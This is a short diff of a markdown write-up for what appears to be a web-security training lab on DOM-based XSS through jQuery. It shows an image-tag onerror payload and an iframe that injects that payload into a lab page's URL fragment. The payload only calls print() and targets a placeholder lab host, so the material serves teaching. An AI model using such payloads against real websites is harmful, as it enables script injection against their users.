@@ -41,12 +41,14 @@ Because jQuery can interpret attacker-controlled input as HTML, this creates a D
 ---
 
 ## Payload Used
-### <img src=x onerror=print()>
+```html 
+<img src=x onerror=print()>
 
 ---
-
+```md
 ## Exploit Delivered
-### <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
 onload="this.src+='<img src=x onerror=print()>'"></iframe>
 
 ---
